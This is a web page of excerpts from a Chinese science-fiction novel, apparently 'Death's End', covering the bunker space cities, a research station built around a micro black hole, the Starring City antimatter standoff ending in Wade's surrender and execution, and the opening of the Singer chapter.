<p>掩体工程最早建成的太空城群落是木星和土星群落，在较晚建设的天王星和海王星群落中，出现了一些新的太空城建设理念，其中最重要的是城市接口。在这两个处于太阳系遥远边缘的群落中，每座太空城都带有一个或多个标准接口，可以相互对接组合，组合后的城市居民的流动空间成倍扩大，有着更好的世界感，对社会经济的发展具有重大意义。连通后的大气和生态系统成为一个整体，运行状态更为稳定。目前的城市对接方式一般为同轴对接，这样对接后可以同轴旋转，保持对接前的重力环境不变。也有平行对接或垂直对接的设想，这样可以使组合后的城市空间在各个方向更为均衡，而不仅仅是同轴组合的纵向扩展，但由于组合体共同旋转将使原有的重力环境发生重大改变，所以没有进行过实际尝试。目前，最大的城市组合体在海王星，八座太空城中的四个同轴组合为一体，形成一个长达两百千米的组合城。在需要的时候，比如黑暗森林打击警报出现时，组合体可以在短时间内分解，以增强各自的机动能力。人们都抱有一个希望——有一天能够使每个城市群落中的所有太空城合为一体，形成四个整体世界。</p>
<p>2016-01-30</p>
<p>目前，在木星、土星、天王星和海王星的背阳面，共有六十四座大型太空城，还有近百座中等和小型太空城以及大量空间站，在由它们构成的掩体世界中，生活着九亿人。</p>
<p>这几乎是现存人类的全部，在黑暗森林打击到来前，地球文明已经进入掩体。</p>
<p>2016-01-30</p>
<p>每座太空城的政治地位相当于一个国家，四个城市群落共同组成太阳系联邦，原联合国演变成联邦政府。历史上地球各大文明都曾出现过城邦时代，现在，城邦世界在太阳系的外围再现了。</p>
<p>地球已经成为一个人烟稀少的世界，只有不到五百万人生活在那里，那是些不愿离开母星家园、对随时可能到来的死神无所畏惧的人。掩体世界中也有许多胆大的人不断地前往地球旅游或度假，每次行程都是赌命的冒险之旅。随着时间的推移，黑暗森林打击日益临近，人们也融入了掩体世界的生活，对母星的怀念在为生计的忙碌中渐渐淡漠。去地球的人一天比一天少了，公众也不再关注来自母亲行星的信息，只知道大自然在重新占领那里的一切，各个大陆都逐渐被森林和草原所覆盖。人们也听说留下的人都过得像国王一样，每个人都住在宽阔的庄园里，都有自己的森林和湖泊，但出家门必须带枪，以防野兽的袭击。整个地球世界目前只是太阳系联邦中的一个普通城邦。</p>
<p>掩体纪元11年，光速二号</p>
<p>2016-01-30</p>
<p>随着太空艇的接近，程心看到这座太空城确实是废墟，它不自转，外表残破，有许多破洞和裂缝，有的地方蒙皮大块地外翻，露出里面的框架。看着在太空艇探照灯照耀下的这座巨大的废墟，程心的心中有一种敬畏和恐惧，她觉得这废墟像一头搁浅的巨鲸，它躺在那里年代久远，只剩下干裂的皮和骨骼，生命早已离它而去。程心觉得展现在自己面前的似乎是一座比雅典卫城更古老的遗址，隐藏着更多的秘密。太空艇慢慢靠近一道大裂缝，裂缝有几个艇身宽，里面的金属框架也扭曲翘起，形成一个破口。太空艇的探照灯从裂缝照进去，程心看到了远方的“地面”，空荡荡的什么都没有。太空艇驶入裂缝一小段后悬停，打开探照灯向各处扫射，程心看到各个方向的“地面”都是空的，不但没有建筑物，也没有任何杂物，看不到曾经有人居住的痕迹，桁架结构的格子在“地面”上清晰可见。</p>
<p>“它是个空壳吗？”程心问。“不是。”</p>
<p>曹彬看了程心几秒钟，好像在估计她的胆量，然后关闭了艇上的探照灯。程心最初看到的是一片黑暗，星光从对面的裂缝透进来，像透过破房子的房顶看夜空一样。但程心的眼睛适应了黑暗后，发现太空城废墟内并非漆黑一片，而是闪着幽幽的蓝光。程心身上一阵发冷，她强令自己镇定下来寻找光源，发现蓝光是从城内空间的中部发出的——那是一个发光点，亮亮灭灭，间隔没有规律，像一只随意眨动的眼睛。废墟的内部也随着光点的明灭时隐时现，刚才空空荡荡的地面充满了奇怪的影子，像暗夜里被天边闪电照亮的荒原。“那光是太空尘埃落入黑洞产生的。”曹彬指着光点的方向说，似乎为了减轻程心的恐惧。</p>
<p>“那里有一个黑洞吗？</p>
<p>2016-01-30</p>
<p>是的，现在距我们……不到五千米吧。一个微型黑洞，史瓦西半径只有二十纳米，质量相当于木卫十三。”</p>
<p>在这幽暗的蓝光中，曹彬给程心讲了光速二号和高Way的故事。对降低真空光速的研究几乎与掩体工程同时开始。作为人类的第二条生存之路，国际社会为此投入了巨大的资源。掩体工程专门为此建立了一座大型太空城作为研究基地，这就是土星群落中的光速一号科学城。但六十年的大规模研究没有取得任何突破，即使在基础理论方面也没什么进展。</p>
<p>在介质中降低光速并不是难事，早在公元2008年，就能够在实验室中把介质光速降低到令人难以置信的每秒十七米，但这与降低真空光速在本质上是不同的。前者只是通过介质原子对光子的吸收和再发射实现的，这中间光子的传播速度仍是标准真空光速，对黑域计划没有意义。真空光速是宇宙基本常数之一，改变它就等于改变宇宙规律，所以，降低真空光速必须在物理学最基础的领域有所突破，这是一件可遇不可求的事。六十年来，基础研究真正的成果是环日加速器的诞生，而它的出现，直接导致了黑域计划中最大规模的研究项目——黑洞项目的实施。</p>
<p>2016-01-30</p>
<p>科学家们一直试图通过各种极端的物理手段对光速产生作用，曾经生成有史以来最强的人造电磁场。但对真空中的光产生作用，最好的选择是引力场，不过在实验室中产生局部强引力场极其困难，唯一可能的途径是黑洞，而环日加速器能够制造微型黑洞。</p>
<p>黑洞项目的首席科学家是高Way，曹彬曾与其共事过几年，他用一种很复杂的感情向程心描述此人：“这个人有很严重的自闭症，不，不是天才自我选择的孤独，就是一种精神缺陷。他极端孤僻，与任何人都没有交流，也从没有与异性交往过。只有在这个时代，他才能在事业上取得那样的成功，不过人家也就是拿他当高智力电池使用而已。他深受这种缺陷的折磨，也一直在试图改变，这一点上他与别的天才完全不同。好像是从广播纪元8年开始，他一直从事降低光速的理论研究，很投入，以至于产生了一种奇怪的移情，他感觉光速就是自己的性格，只要能够改变光速，也就能改变自己。</p>
<p>“但真空光速确实是宇宙中最强硬的东西，降低光速的试验研究就像是对光的不择手段的酷刑。人们把各种极端的物理手段作用于光，打击它，扭曲它，折断它，肢解它，拉伸它，压扁它，甚至消灭它，但最大的成果也不过是在真空传播中改变了它的频率，光的速度则纹丝不动，像一堵不可逾越的墙。几十年下来，无论是搞理论的还是搞实验的，都有些绝望了，有一个说法，如果真有造物主，他在创造宇宙时只焊死了一样东西：光速。而对于高Way，这种绝望又深了一层，在我冬眠时他已经快五十岁了，还从未接近过女人，他感觉自己的命运就像真空光速一样硬，于是显得更加自闭和孤僻。</p>
<p>2016-01-30</p>
<p>黑洞项目是在掩体纪元元年开始的，历时十一年。其实，项目的规划者们并没有对此抱什么希望，无论是理论计算还是天文观测都表明，黑洞也不可能改变光速，这些宇宙中的魔鬼也只能用自己的引力场改变光线的路径和频率，对真空光速没有丝毫影响。但要使黑域计划的研究进行下去，就要有超高密度引力场的实验环境，这只能借助黑洞。还有一个理由：黑域本质上是一个大型低光速黑洞，对一个微型标准光速黑洞进行近距离研究，也许能得到什么意外的启示。</p>
<p>“环日加速器可以在短时间内产生微型黑洞，但这样小的黑洞会在短时间里蒸发。为了得到稳定的黑洞，微型黑洞在加速器中产生后立刻被导出，并被注入木卫十三内部。“木卫十三是木星最小的一颗卫星，半径只有八千米，只是一个大石块。在产生黑洞之前，曾把这颗卫星从它的高轨道降低，并使它与城市群落一样成为太阳卫星，与木星平行运行。与其他太空城不同的是，它位于木星与太阳的第二拉格朗日点，就是我们现在的位置，能与木星保持稳定距离，不需要位置维持。这是人类迄今为止在太空中推送的最大质量的物体。</p>
<p>“微型黑洞被射入木卫十三，吸入物质后急剧扩大，与此同时，物质进入黑洞时产生的巨量辐射也迅速熔化周围的岩石。很快，半径八千米的整个木卫十三都被熔化了，这块土豆形的巨石变成了一个发着红光的岩浆球。这个岩浆球体积在慢慢缩小，亮度却越来越高，最后在一团超强的闪光中消失得无影无踪。据观测，除了最后被辐射驱散的一小部分物质外，木卫十三的大部分物质都被黑洞吸入。这个黑洞变得稳定了，它的史瓦西半径，或者说视界半径，由一个基本粒子大小增长到二十一纳米。“然后，以黑洞为中心建造了一座太空城，这就是光速二号。黑洞悬浮在光速二号的中心，这完全是一座空城，处于与太空连通的真空状态，不自转，实际上就是一个容纳黑洞的巨型容器。人员和设备都可以进入太空城对黑洞进行研究。</p>
<p>2016-01-30</p>
<p>“对黑洞的研究持续了多年，这是人类第一次在实验室状态下对黑洞样品进行研究，取得了大量的成果，发展了理论物理学和宇宙学的基础理论。但这些成果对于降低真空光速都没有帮助。</p>
<p>“在黑洞样品研究开始后的第六年，高Way遇难了。按照世界科学院的官方说法，他在研究工作出现的一次事故中‘被吸入黑洞’。“其实稍有常识的人都明白，高Way‘被’吸入的可能性微乎其微。黑洞之所以成为连光都能吸入的超级陷阱，并非因为它有巨大的引力总量（当然，由恒星坍缩而成的大型黑洞引力总量也是很大的），而是，具有超高的引力密度。从远距离上看，它的引力总量其实与相同质量的普通物质相当。假如太阳坍缩成黑洞，地球和各大行星将仍然在原轨道上运行，不会被吸进去。只有在十分靠近黑洞的范围内，它的引力才显示出魔力。</p>
<p>“在光速二号中，黑洞周围有一张防护网，半径是五千米，在研究工作中人员禁止进入网内。木卫十三的原半径仅八千米，所以黑洞在这个距离上的引力值与以前站在木卫十三上差不多。这个引力是十分微小的，人在那里的感觉与失重差不多，完全可以凭借太空服上的推进器逃脱。所以，高Way不太可能是‘被’吸入的。“在得到稳定的黑洞样品后，高Way就对它着了迷。与光速搏斗了这么多年，不能撼动它丝毫，连这个接近三十万的常数小数点后面的许多位都改变不了分毫，他充满了焦躁和挫败感。真空光速恒定是宇宙的基本规律之一，于是他对宇宙规律既怕又恨。可眼前有这么一个东西，一个能把木卫十三压缩到二十一纳米的东西，在它的视界内部，在那个时空奇点里，已知的宇宙规律失效。</p>
<p>“高Way常常趴在防护网上，连续几个小时盯着五千米远处的黑洞看，看着它像现在这样幽幽地闪亮。有时他声称黑洞在说话，他从闪光中看出了什么信息。“没有人看到高Way被吸入的过程，如果有录像也从未公布。他是黑洞项目的主要物理学家之一，有打开防护网入口的口令。他肯定进去了，一直向黑洞飘过去，一直接近到黑洞引力使他无法返回的距离……他可能只是想近距离看看这个让自己迷恋的东西，也可能是决定进入那个宇宙规律不起作用的奇点来逃避这一切。</p>
<p>“以后的事情就很诡异了。高Way被吸入后，人们用遥控显微镜观察黑洞，发现黑洞的事件视界，也就是那个半径仅二十一纳米的微小球面上，有一个人影，那就是正在通过视界的高Way。“根据广义相对论，对于一个遥远的观察者来说，事件视界附近的时间急剧变慢，落向视界的高Way掉落过程本身也变慢至无限长。</p>
<p>“但以高Way为参照系，他已经穿过了视界。“更离奇的是，那个人影各部分的比例是正常的，也许是由于黑洞很小，潮汐力并没有作用到他身上。他被压缩到如此微小，但那一处的空间曲率也极大，所以不止一名物理学家认为视界上的高Way身体结构并没有遭到破坏，换句话说，现在他可能还活着。</p>
<p>掩体纪元11年，星环城</p>
<p>2016-01-30</p>
<p>在接近星环城时，程心和曹彬的太空艇遇到了联邦舰队的封锁线。有二十多艘恒星级战舰分布在星环城周围，对这座城市实施的包围和封锁已经持续了两个星期。恒星级战舰本来也都堪称庞然大物，但与太空城相比就很小了，像飘浮在一艘巨轮周围的小舢板；封锁星环城的战舰是太阳系联邦舰队的大部分力量了。</p>
<p>当两支三体舰队消失在茫茫太空，三体世界与人类再无联系后，新的来自外星的威胁以完全不同的形式出现。为抗击三体侵略而诞生的舰队国际已失去了存在的基础，渐渐衰落，最后解体了。原属舰队国际的太阳系舰队归属太阳系联邦，这是第一次由统一的世界政府控制人类武装力量的主体。现在，维持庞大的太空舰队已没有必要，舰队的规模大大缩小。在掩体工程开始后，原有的一百多艘恒星级战舰中的大部分都转为民用，拆除了武器和生态循环系统，担负着各个掩体行星间的工程运输。仅有三十艘恒星级战舰在服役。六十多年来，联邦也没有建造任何新的战舰，因为大型战舰成本高昂，两三艘恒星级战舰的投资就相当于一座大型太空城的基建费用；同时也不再需要新的战舰了，联邦舰队的主要力量都投入到了建设太阳系预警系统上。</p>
<p>2016-01-30</p>
<p>这时，太空艇正在驶向星环城，特使已经离开，艇上只有程心和曹彬两人。前方的太空中出现一个环形的构造物，曹彬指令太空艇驶近它并减速。那个圆环光洁的金属表面把星光拉长成一道道光纹，也反映着太空艇变形的映像，让人不由得想起“蓝色空间”号和“万有引力”号在四维空间中见到的“魔戒”。太空艇悬停在环的旁边，程心目测了一下，环的直径大约两百米，环箍约五十米粗。</p>
<p>2016-01-30</p>
<p>这就是环日加速器。”曹彬说，语气中带着明显的敬畏。</p>
<p>“这么小？”“哦，对不起，我说得不准确。这只是环日加速器的一个加速线圈，这种线圈有三千二百个，间距约一百五十万千米，在木星轨道上环绕太阳一圈。被加速的粒子可不是在这个环里运行，而是从环中间穿过，被线圈产生的力场加速，飞向下一个线圈再被加速……可以这样绕太阳一圈或几圈。”</p>
<p>程心想了几秒钟后，突然恍然大悟。之前程心听曹彬多次提到过环日加速器，在她的脑海中总是浮现出悬浮在太空中的一圈管道，它的长度肯定是惊人的，但要成为环绕太阳的长城，即使在水星轨道之内也令人难以置信，那是另一个上帝工程了。现在，程心突然悟出了一件事：在地球陆地上的加速器管道是为了让粒子在真空中运行，而在真空的太空中，粒子加速器是不需要管道的！被加速的粒子可以在太空中飞行，从一个加速线圈飞向另一个。程心不由得转头看线圈对着的另一个方向。“下一个线圈在一百五十万千米之外，相当于地球到月球距离的四五倍，看不到的。”曹彬说，“这是真正的超级加速器，能把粒子加速到宇宙大爆炸时的创世能量。粒子的加速轨道附近是严禁航行的，但几年前，一艘迷航的运输飞船误入加速轨道，被已经加速的粒子束击中，超高能粒子击中飞船后产生高能次级簇射，使飞船和它装载的上百万吨矿石瞬间气化了。”</p>
<p>曹彬还告诉程心，环日加速器的总设计师是毕云峰。在这六十多年中，他为这个工程工作了三十五年，其余时间冬眠，去年刚刚苏醒，岁数比曹彬要老许多。“但这老家伙是很幸运的，一个在公元世纪的地球上造加速器的人，三个世纪后又造了一个环绕太阳的加速器，人生如此，也是很成功了。不过这老头很偏激，狂热地支持星环城独立。”</p>
<p>2016-01-30</p>
<p>反对光速飞船的力量主要来自公众和政界，而支持者则大部分来自科学界。星环城成为向往光速宇宙飞行的科学家心中的圣地，吸引了大批优秀的学者，即使联邦体制内的科学家，明里暗里也与星环集团有着大量的合作，这使得星环集团在基础研究的许多领域处于领先地位。</p>
<p>2016-01-30</p>
<p>太空艇离开线圈继续飞行，星环城已经近在眼前。这座太空城采用少见的轮辐形结构，城市像一个在太空中旋转的大轮子。这种构型结构强度高，但内部空间不够开阔，缺少“世界感”。有评论说，星环城不需要世界感，对于这里的人来说，他们的世界是整个星空。</p>
<p>2016-01-30</p>
<p>在辐条通道中的升降梯上，重力渐渐出现，当达到1个G时，他们进入了城市。这座太空科学城由三部分构成：星环科学院、星环工程院和环日加速器控制中心。城市实际上是一条长达三十多千米的环形大隧道，确实没有整体中空构型的太空城那种广阔的空间感，但也并不觉得狭窄。</p>
<p>2016-01-30</p>
<p>城市里看不到机动车，人们都骑着自行车出行，路边停放着许多自行车供人们取用。但是，前来接程心和曹彬的是一辆很小的敞篷机动车。</p>
<p>由于大环中的重力只有一个方向，所以城市只能建在环的一侧，另一侧则成为天空，投射着蓝天白云的全息影像，这多少弥补了一些“世界感”的不足。有一群鸟鸣叫着飞过，程心注意到它们不是影像，是真的。在这里，程心感觉到一种在其他太空城中没有的舒适感。这里的植被很丰富，到处是树木和草坪，建筑都不高。科学院的建筑都是白色的，工程院是蓝色的，但风格各异，这些精致的小楼半掩在绿树丛中，使她有一种回到大学校园的感觉。程心注意到一个有趣的地方，像是古代雅典一个神庙的废墟，在一个石块筑成的平台上，有几根断裂后长短不一的古希腊风格的大石柱，石柱上爬满了青藤，石柱中间有一座喷泉，在阳光下哗哗地喷出清亮的水柱。有几个衣着休闲的男女或靠在石柱上，或躺在喷泉旁边的草坪上，一副悠然自得的样子，似乎忘记了这座城市处于联邦舰队的包围中。在废墟旁边的草坪中，有几座雕塑，程心的目光突然被其中一个吸引住了，那是一把长剑，被一只套着盔甲的手握着，正从水中捞起一个星星组成的环，水不停地从星环上滴下去。程心的记忆深处对这个形象有些印象，但一时又想不起来在哪里见过，她在车上一直注视着那座雕塑消失。</p>
<p>2016-01-30</p>
<p>就在实验室门前的草坪上，程心见到了维德和毕云峰。</p>
<p>维德自接管星环集团后从未冬眠，现在已经一百一十岁，他的头发和胡须仍剃得很短，全都是雪白的了。他不拄拐杖，步伐稳健，但背有些驼，一只袖管仍然空着。在与他目光相对的一刹那，程心明白这人仍然没有被时光击败，他身上核心的东西没有被时间夺走，反而更凸显了，就像冰雪消融后露出的岩石。毕云峰的年龄应该比维德小许多，但看上去更老些，他看到程心时很兴奋，似乎急着对她展示什么。</p>
<p>“你好，小女孩儿，我说过这时你仍年轻，我的岁数已经是你的三倍了。”维德说，他对程心露出的微笑仍然远不能令她感到温暖，但已没有那种冰水似的寒意了。面对两个老者，程心感慨万千。他们为了共同的理想奋斗了六十多年，现在已经走到人生的尽头；而她自己，从威慑纪元第一次苏醒后似乎历尽沧桑，可是在非冬眠状态下竟然只过了四年！她现在是三十三岁，在这个平均寿命达一百五十岁的时代还是少女的年龄。</p>
<p>2016-01-30</p>
<p>。但这并不等于说这群战士在视觉上没有威慑力，让程心感到时光倒流的不仅仅是他们的古代武器，还有他们的样子。他们表现出一种经过训练的整体性，不仅在服装和装备上，还有精神状态的一致。这些战士身体强壮，强劲的肌肉在薄薄的太空服下鼓起，他们都有线条刚劲的脸庞，目光和表情都很相似，透出金属般的冷酷和视生命如草芥的漠然。</p>
<p>2016-01-30</p>
<p>“这是城市自卫队。”维德对着武装的人群挥了一下手，“是我们保卫星环城和光速飞船理想的全部力量，几乎是全部了，外面还有一些人，还会有更多的人加入，但总人数不会超过一百。至于他们的装备……”维德从一名战士身上拿下步枪，哗啦一声拉动枪栓，“你没看错，古代武器，用现代材料制造，子弹的发射药也不是火药，比真正的古代步枪射程要远一些，精度要高一些。在太空中，这些枪可以在两千千米外击中一艘大型战舰，但也仅此而已，很原始的玩意儿。你一定觉得这很可笑，我也有这种感觉，除了一点——”他把枪还给那名战士，又从他胸前的弹链上抽出一发子弹，“我说过，基本上是古代的子弹，但弹头是新的，对现在而言也是未来的技术。这个弹头是一个超导容器，内部高度真空，用磁场把一粒小球悬浮在正中，避免它与外壳接触，这粒小球是反物质。”</p>
<p>毕云峰带着明显的自豪说：“环日加速器不仅仅用来做基础研究实验，它还用来制造反物质。特别是最近四年，它一直在全功率运行制造反物质，现在，我们拥有一万五千发这样的子弹。”这时，维德手中那颗看似原始的子弹让程心浑身发冷。她首先担心的是那个小小的超导容器中的约束磁场是否稳定可靠，稍有偏差，反物质小球接触外壳，整个星环城就会在湮灭的闪光中彻底毁灭。她又看看战士们胸前那一条条金黄色的弹链，那是死神的链条，仅一条弹链上的子弹就可以摧毁整个掩体世界。维德接着说：“我们不用从太空出击，只等舰队靠近，从城市射击就可以。对这二十多艘战舰，我们可以向每一艘战舰发射几十发甚至上百发子弹，只要有一发命中就可以摧毁它。作战方式虽然很原始，但很灵活，一个人一支枪就是一个能够威胁战舰的作战单位。另外，我们还有人带着手枪潜入了其他太空城。”他说着，把子弹插回战士的弹链上，“我们不希望有战争。在最后谈判时，我们会向联邦特使展示我们的武器，并向他诚实地介绍我们的作战方式，希望联邦政府能够权衡战争的代价，放弃对星环城的威胁。我们的要求不高，只是想在距太阳系几百个天文单位的远方建一个曲率发动机试验基地而已。”</p>
<p>“可如果真的爆发战争，我们有胜利的把握吗？”曹彬问，他一直没有说话，显然与毕云峰不同，他并不赞成战争的选择。“没有。”维德平静地回答，“但他们也没有，我们只能试一下了。”</p>
<p>在看到维德手中的反物质子弹时，程心已经知道自己该怎么办，她对联邦舰队并不是太担心，相信他们有办法防御这种攻击；现在，她的大部分思想集中在一件事上，维德之前说过的一句话在她的脑海中反复回荡：我们还有人带着手枪潜入了其他太空城。</p>
<p>如果战争爆发，那些潜入掩体世界其他太空城的游击队员，用装有反物质子弹的手枪向地面随意开一枪，正反物质湮灭的爆炸将瞬间撕裂城市薄薄的外壳，烧焦内部的一切，然后，旋转中的城市将在太空中解体为碎片，上千万人将死亡。太空城像鸡蛋一样脆弱。</p>
<p>维德没有明确说过要攻击太空城，但不等于他不会这样做。程心的眼前浮现出一百多年前他用枪对准自己时的画面，那幕景象像被烙铁烙在她心中，她不知道一个男人要冷酷到什么程度才能做出那样的选择。这个人精神的核心，就是极端理智带来的极端冷酷和疯狂，她似乎又看到了三个多世纪前更年轻时的维德，像发狂的野兽般声嘶力竭地咆哮：“前进！前进！！不择手段地前进！！！”</p>
<p>2016-01-30</p>
<p>即使维德真的不想攻击太空城，别人呢？像是要证实程心的忧虑，一名城市自卫队的战士说话了：</p>
<p>“程心博士，请你相信，我们会战斗到底的。”另一名战士接下他的话：“这不是为你而战，不是为维德先生而战，也不是为这座城市而战。”他一手指着上方，眼中喷出火焰，“知道他们要从我们这里夺走什么吗？不是城市和光速飞船，是太阳系外的整个宇宙！是宇宙中亿万个美妙的世界！他们不让我们到那些世界去，他们把我们和我们的子孙关在这个半径五十个天文单位、名叫太阳系的监狱里！我们是在为自由而战！为成为宇宙中的自由人而战！我们与古代那些为自由而战的人没什么区别，我们会战斗到底！我这是代表自卫队所有人说话。”</p>
<p>在一片阴郁冰冷的目光中，战士们纷纷对程心点头。在以后的岁月里，程心会无数次想起这名战士的话，但现在，他的话没有打动她。她感到天昏地暗，陷入深深的恐惧中。她突然又有了一百三十多年前在联合国大厦前怀抱婴儿的感觉，现在，她感到自己怀抱着的婴儿面对一群恶狼，只想尽自己的力量保护怀中的孩子。</p>
<p>“你的诺言还有效吗？”她问维德。维德对她点点头，“当然，要不为什么叫你来？”</p>
<p>“那好，立刻停止战争准备，停止一切抵抗，把所有的反物质子弹交给联邦政府，特别是你们那些潜入其他太空城的人，也立刻这样做！”所有战士的目光都聚焦在程心身上，像要把她烧毁一样。力量对比太悬殊了，她面对着一群冷酷的战争机器，每人身上都背着上百颗氢弹，这些力量在一个强有力的狂人统率下，凝结成一个能够碾碎一切的黑色巨轮；而她，只是一个弱小的女子，正如维德所说，是这个时代里的一个小女孩，在这滚滚向前的巨轮前，她只是一株小草，不可能挡住什么，但她能做的也只有这些了。</p>
<p>但事情与她想象的不同，巨轮似乎在小草前停止了滚动，战士们聚焦在她身上的目光渐渐移开，转移到维德身上。那令她窒息的压迫感也一点点减轻，但她仍然难以呼吸。维德没有看任何人，只是盯着透明罩中那个放着程心头发的曲率驱动平台。那就像一座神圣的祭坛，程心可以想象，维德曾经把这些战士集合在这座祭坛周围，做出战争的决定。“再考虑一下吧。”维德说。</p>
<p>“不需要考虑。”程心的声音异常决绝，“我再说一遍最后的决定：停止抵抗，交出星环城中的所有反物质。”维德抬头看着程心，目光中又露出了那种罕见的无助和乞求，他一字一顿地说：“失去人性，失去很多；失去兽性，失去一切。”</p>
<p>“我选择人性。”程心说，环视所有人，“我想你们也是。”维德挥手制止了想对程心说什么的毕云峰。他的目光黯淡下来，有什么东西熄灭了，永远熄灭了，岁月崩塌下来，压在他身上，他显得疲惫无力。他用仅有的一只手扶着金属平台，吃力地在别人刚搬来的一把椅子上坐下，然后慢慢抬起手，指指面前的平台，低垂着目光。</p>
<p>2016-01-30</p>
<p>“把你们的子弹都集中到这里，所有的。”</p>
<p>开始没有人动，但程心明显感到有什么东西在软下来，黑色的力量正在消解。战士们的目光从维德身上移开，散漫开来，不再集中到任何方向。终于有人走过来，把两条子弹链放到平台上，虽然他放得很轻，但子弹和平台之间的金属撞击声还是让程心战栗了一下。弹链静静地躺在平台上，像两条金黄色的蛇。接着第二个人走过来放下弹链，然后是更多的人，平台上很快堆起了黄灿灿的一堆。所有子弹都集中到平台上后，弹链放下时发出的下雨一般的哗哗声消失了，寂静又笼罩了一切。“命令掩体世界中所有的星环武装力量，放下武器，向联邦政府投降。市政府配合舰队接管城市，不要有任何过激行动。”维德说。</p>
<p>“是。”人群中有人回答，没有了弹链，这群身穿黑色太空服的人显得更暗了。维德挥挥手让自卫队离开，他们无声地走出去，大厅中像乌云消散般亮起来。维德吃力地起身，绕过高高堆起的反物质子弹链，慢慢掀开了透明罩，对着光洁的曲率驱动平台轻轻吹了一口气，程心的头发被吹走了，他盖上罩后抬头对程心微笑了一下：</p>
<p>“小女孩，你看，我遵守了诺言。”</p>
<table>
<thead>
<tr>
<th>注</th>
<th>人类最后抉择，人类因此丧失了最后的机会</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-30</p>
<p>星环城事件结束后，联邦政府并没有立刻公布反物质武器的事。国际社会认为此事的结局在预料之中，并没有太大的反响。作为环日加速器的建造者，星环集团在国际社会拥有很高声誉，公众舆论对星环集团持宽容态度，认为没有必要追究任何人的法律责任，应尽快恢复星环城的自治。今后，只要保证不再从事与曲率驱动飞船有关的任何研究和技术开发，并把公司的活动置于联邦政府的严密监督之下，星环集团就可以继续开展自己的事业。</p>
<p>但一周后，联邦舰队参谋部向全世界展示了缴获的反物质子弹。当那堆金黄色的死神出现在人们眼前时，举世震惊。星环集团被宣布为非法，联邦政府没收其全部资产，完全接管环日加速器，联邦太空军宣布对星环城长期占领，并解散星环科学家院和工程院。包括维德在内的星环集团上层和城市自卫队的三百多人被逮捕。</p>
<p>在随后进行的太阳系联邦法庭审判中，托马斯·维德以反人类罪、战争罪和违反曲率驱动技术禁止法罪被判处死刑。在太阳系联邦的首都地球一号太空城，在联邦最高法院附近一间纯白色的羁押室内，程心见到了维德。隔着一面透明屏，他们相视无语。程心看到，这个一百一十岁的人很平静，像一潭干涸前的静水，再也不泛起一丝波纹。</p>
<p>程心从透明屏的小窗中递给维德一盒雪茄，那是她在太平洋一号太空城中那个飘浮的集市买的。维德接过小木盒后，打开取出了里面十支雪茄中的三支，然后把木盒还给程心。“多的用不着了。”他说。</p>
<p>“给我讲一些你的事情吧，你的事业，你的生活，我可以对后人讲。”程心说。维德缓缓地摇摇头，“无数死了的人中的一个而已，没什么可说的。”程心知道，隔开他们的除了这面透明屏，还有人世间最深的、已经永远不可能跨越的沟壑。</p>
<p>“那你有什么话要对我说吗？”程心最后问出了这句话，让自己吃惊的是，她期望得到回答。“谢谢你的雪茄。”</p>
<p>过了好一会儿，程心才意识到这就是维德要对她说的话，最后的、全部的话。他们在寂静中坐着，谁也没看对方，时间仿佛也变成了一潭死水，淹没了他们。直到太空城位置维持的震动使程心回到现实，她才缓缓起身，低声与维德告别。</p>
<p>一出羁押室的门，程心就从木盒中拿出一支雪茄，向看守借了打火机，抽了有生以来的第一口烟。奇怪的是她没有咳嗽，看着白色的烟雾在首都的太阳前袅袅升起，像三个世纪的岁月一样在她的泪眼中消散。三天后，在一道强激光中，托马斯·维德在万分之一秒内被气化。</p>
<p>2016-01-30</p>
<p>被返还的还有“星环”号飞船，这已经是该型号飞船的第三代，是一艘能够乘坐两至三人的小型恒星际飞船，里面的生态系统十分舒适精致，像一个优美的小花园。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>这是一艘光速飞船</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-30</p>
<p>程心和AA在地球人烟稀少的各个大陆上游荡，她们乘飞车飞过一望无际的森林，骑马在草原上漫步，行走在没有人烟的海滩。大部分城市已经被森林和藤蔓覆盖，许多城市只留下一块小镇大小的居住区。这时，地球的人口数量相当于新石器时代晚期。</p>
<p>在地球上待的时间越长，越感觉到整个人类文明史像是一场大梦</p>
<p>2016-01-30</p>
<p>她们还去了澳大利亚。那个大陆上只在堪培拉还有人居住，并残存着一个小镇大小的政府，仍自称为澳大利亚联邦。当年智子宣布灭绝计划的议会大厦的大门已经被茂密的植物封死，藤蔓甚至爬到了八十多米高的旗杆上。从政府的档案中她们查到了弗雷斯的记录，老人活了一百五十多岁，但终于被时间所击败，十多年前去世了。</p>
<p>2016-01-30</p>
<p>她们又来到默斯肯岛。老杰森建的灯塔还在，但早已不能发光，这一带也成了无人区。在岛上她们又听到了大旋涡的声音，但放眼望去，只看到夕阳中空荡荡的海面。她们的未来也是空荡荡的。</p>
<p>AA说：“我们去打击后的时代吧，太阳消失后的时代，只有那时才有安稳的生活。”程心也想去打击后的时代，倒不是为了安稳的生活，而是由于她制止了毁灭性的战争，又将受到万众的崇拜，这使得她不可能在这个时代生活下去。她也想亲眼看到地球文明在黑暗森林打击后继续生存和繁荣，那是让她的心灵得以安宁的唯一希望。她想象着在那太阳变成的星云中的生活，那里能找到真正的宁静，甚至能找到幸福，那将是她人生的最后港湾。</p>
<p>她毕竟才三十三岁。程心和AA乘“星环”号回到了木星城市群落，再次在亚洲一号太空城中进入冬眠，预定的时间是两百年，但在合同中注明：这期间如果黑暗森林打击降临，她们将随时被唤醒。</p>
<p>掩体纪元67年，银河系猎户旋臂</p>
<p>2016-01-30</p>
<p>掩体纪元67年</p>
<p>银河系猎户旋臂翻阅坐标数据是歌者的工作，判断坐标的诚意是歌者的乐趣。</p>
<p>歌者知道自己做的不是什么大事，拾遗补阙而已，但这是一件必须做的事，且有乐趣。说到乐趣，在这粒种子从母世界起航时，那里还是一个充满乐趣的地方，但后来，自从母世界与边缘世界的战争开始后，乐趣就渐渐减少了。到现在，一万多个时间颗粒过去了，无论是在母世界还是在种子里，都没多少乐趣可言，古典时代的那些乐趣都写在古歌谣中，吟唱那些歌谣，也是现在不多的乐趣之一。</p>
<p>歌者翻阅数据时正在吟唱着一首古歌谣：我看到了我的爱恋</p>
<p>我飞到她的身边我捧出给她的礼物</p>
<p>那是一小块凝固的时间时间上有美丽的条纹</p>
<p>摸起来像浅海的泥一样柔软……</p>
